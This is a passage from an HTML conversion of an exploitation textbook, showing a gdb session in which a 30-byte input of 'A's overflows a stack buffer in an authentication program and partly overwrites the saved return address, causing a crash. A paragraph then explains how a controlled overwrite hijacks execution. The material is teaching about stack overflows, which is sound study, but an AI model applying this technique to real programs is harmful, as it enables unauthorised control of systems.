style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb8000ce0</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xbffff848</p></td></tr></table><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) cont Continuing.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 36pt;text-indent: -17pt;line-height: 107%;text-align: left;">Breakpoint 3, check_authentication (password=0xbffff9b7 &#39;A&#39; &lt;repeats 30 times&gt;) at auth_overflow2.c:16</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">16       return auth_flag; (gdb) x/32xw $esp</p><table style="border-collapse:collapse;margin-left:16.9376pt" cellspacing="0"><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7a0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7c0</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x080485dc</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7b8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x080482d9</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7b0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xb7f9f729</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd6ff4</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff7e8</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7c0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41414141</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x41414141</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x41414141</p></td><td style="width:62pt"><p class="s45" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x41414141</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7d0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41414141</p></td><td style="width:68pt"><p class="s45" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x41414141</p></td><td style="width:64pt"><p class="s45" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x41414141</p></td><td style="width:62pt"><p class="s64" style="padding-right: 3pt;text-indent: 0pt;line-height: 10pt;text-align: right;">@<span class="s45">0x08004141</span></p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff7e0:</p></td><td style="width:66pt"><p class="s45" style="padding-left: 8pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff9b7</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x08048510</p></td><td style="width:64pt"><p class="s42" style="padding-left: 10pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xbffff848</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xb7eafebc</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7f0:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000002</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff874</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0xbffff880</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0xb8001898</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff800:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000000</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x00000001</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x00000001</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">0x00000000</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff810:</p></td><td style="width:66pt"><p class="s42" style="padding-left: 7pt;padding-right: 9pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0xb7fd6ff4</p></td><td style="width:68pt"><p class="s42" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xb8000ce0</p></td><td style="width:64pt"><p class="s42" style="padding-left: 9pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x00000000</p></td><td style="width:62pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: right;">0xbffff848</p></td></tr><tr style="height:11pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) cont</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:60pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Continuing.</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:68pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:62pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGSEGV, Segmentation fault. 0x08004141 in ?? ()</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_370.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">When some of the bytes of the saved return address are overwritten, the program will still try to use that value to restore the execution pointer regis- ter (EIP). This usually results in a crash, since execution is essentially jumping to a random location. But this value doesnâ€™t need to be random. If the over- write is controlled, execution can, in turn, be controlled to jump to a specific location. But where should we tell it to go?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part56.htm">0x330 Experimenting with BASH</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part54.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part56.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
